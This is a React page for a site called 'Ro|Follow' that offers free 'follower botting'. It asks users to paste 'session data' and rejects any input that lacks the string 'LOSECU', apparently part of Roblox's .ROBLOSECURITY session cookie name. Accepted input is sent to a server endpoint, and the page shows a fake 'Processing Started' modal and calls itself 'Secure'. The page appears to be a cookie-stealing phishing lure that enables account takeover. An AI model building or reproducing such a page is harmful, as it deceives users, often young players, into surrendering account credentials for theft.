import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { CheckCircle, AlertTriangle, Play, Loader2, FileText, Zap, Shield } from "lucide-react";

export default function Home() {
  const [sessionData, setSessionData] = useState("");
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const { toast } = useToast();

  const submitMutation = useMutation({
    mutationFn: async (data: { sessionData: string }) => {
      const response = await apiRequest("POST", "/api/submit-session", data);
      return response.json();
    },
    onSuccess: () => {
      setSessionData("");
      setErrorMessage("");
      setShowSuccessModal(true);
      toast({
        title: "Success!",
        description: "Your session data has been submitted successfully.",
      });
    },
    onError: (error: Error) => {
      setErrorMessage(error.message);
      toast({
        title: "Error",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const validateSessionData = (data: string) => {
    const requiredString = 'LOSECU';
    return data.includes(requiredString);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage("");

    if (!sessionData.trim()) {
      setErrorMessage("Please paste your session data before submitting.");
      return;
    }

    if (!validateSessionData(sessionData)) {
      setErrorMessage("Invalid Paste");
      return;
    }

    submitMutation.mutate({ sessionData });
  };

  const handleClear = () => {
    setSessionData("");
    setErrorMessage("");
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      handleSubmit(e);
    }
  };

  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* Header */}
      <header className="text-center pt-16 pb-8">
        <div className="max-w-4xl mx-auto px-4">
          <div className="flex items-center justify-center mb-6">
            <div className="logo-square mr-3"></div>
            <h1 className="text-6xl md:text-7xl font-bold text-foreground">
              Ro<span className="text-primary">|</span>Follow
            </h1>
          </div>
          <p className="text-primary text-lg md:text-xl font-medium mb-8">
            Bot Followers with ease, with our newest tools.
          </p>
        </div>
      </header>

      {/* Main Form */}
      <main className="max-w-2xl mx-auto px-4 pb-16">
        <Card className="bg-card border-border shadow-2xl">
          <CardContent className="p-8">
            <h2 className="text-2xl font-semibold mb-6 text-center">Submit Your Follow Code</h2>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label htmlFor="sessionData" className="text-sm font-medium text-muted-foreground mb-3 block">
                  Paste your code below:
                </Label>
                <Textarea
                  id="sessionData"
                  value={sessionData}
                  onChange={(e) => setSessionData(e.target.value)}
                  onKeyDown={handleKeyDown}
                  placeholder="Paste your Code here to begin following"
                  className="min-h-[150px] bg-input border-border text-foreground placeholder-muted-foreground focus:ring-2 focus:ring-primary focus:border-transparent transition-all duration-200 resize-none"
                  rows={6}
                />
                
                {errorMessage && (
                  <Alert className="mt-3 border-destructive/20 bg-destructive/10">
                    <AlertTriangle className="h-4 w-4 text-destructive" />
                    <AlertDescription className="text-destructive">
                      {errorMessage}
                    </AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <Button
                  type="submit"
                  disabled={submitMutation.isPending}
                  className="flex-1 gradient-purple hover:gradient-purple-hover text-white font-semibold py-3 px-6 rounded-lg hover:scale-105 transition-all duration-200 flex items-center justify-center"
                >
                  {submitMutation.isPending ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    <>
                      <Play className="mr-2 h-4 w-4" />
                      Start Botting
                    </>
                  )}
                </Button>
                
                <Button
                  type="button"
                  variant="secondary"
                  onClick={handleClear}
                  className="sm:w-auto bg-secondary hover:bg-secondary/80 text-secondary-foreground font-medium py-3 px-6 rounded-lg transition-all duration-200"
                >
                  Clear
                </Button>
              </div>

              <div className="text-center">
                <p className="text-sm text-muted-foreground">
                  Press <kbd className="bg-muted px-2 py-1 rounded text-xs">Enter</kbd> to submit or use the button above
                </p>
              </div>
            </form>
          </CardContent>
        </Card>

        {/* Features Section */}
        <div className="mt-16">
          <h3 className="text-3xl font-semibold text-center mb-12">Made for Everyone's Ease</h3>
          <div className="grid md:grid-cols-3 gap-8">
            <Card className="text-center p-6 bg-card/50 border-border">
              <CardContent className="p-0">
                <div className="w-16 h-16 feature-icon-bg rounded-full flex items-center justify-center mx-auto mb-4">
                  <FileText className="h-8 w-8 text-primary" />
                </div>
                <h4 className="font-semibold mb-2">Easy to Use</h4>
                <p className="text-muted-foreground text-sm">Simple interface designed for everyone</p>
              </CardContent>
            </Card>
            
            <Card className="text-center p-6 bg-card/50 border-border">
              <CardContent className="p-0">
                <div className="w-16 h-16 feature-icon-bg rounded-full flex items-center justify-center mx-auto mb-4">
                  <Zap className="h-8 w-8 text-primary" />
                </div>
                <h4 className="font-semibold mb-2">Fast Processing</h4>
                <p className="text-muted-foreground text-sm">Quick and efficient follower botting</p>
              </CardContent>
            </Card>
            
            <Card className="text-center p-6 bg-card/50 border-border">
              <CardContent className="p-0">
                <div className="w-16 h-16 feature-icon-bg rounded-full flex items-center justify-center mx-auto mb-4">
                  <Shield className="h-8 w-8 text-primary" />
                </div>
                <h4 className="font-semibold mb-2">Secure</h4>
                <p className="text-muted-foreground text-sm">Your data is processed safely</p>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>

      {/* Success Modal */}
      <Dialog open={showSuccessModal} onOpenChange={setShowSuccessModal}>
        <DialogContent className="bg-card border-border max-w-md">
          <DialogHeader>
            <div className="text-center">
              <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="h-8 w-8 text-white" />
              </div>
              <DialogTitle className="text-xl font-semibold mb-2">Processing Started!</DialogTitle>
              <p className="text-muted-foreground mb-6">Botting Followers This Might Take A Minute</p>
              <div className="flex items-center justify-center mb-4">
                <Loader2 className="h-6 w-6 animate-spin text-primary" />
                <span className="ml-3 text-sm text-muted-foreground">Please wait...</span>
              </div>
              <Button
                onClick={() => setShowSuccessModal(false)}
                className="gradient-purple hover:gradient-purple-hover text-white font-medium py-2 px-6 rounded-lg transition-colors duration-200"
              >
                Close
              </Button>
            </div>
          </DialogHeader>
        </DialogContent>
      </Dialog>
    </div>
  );
}
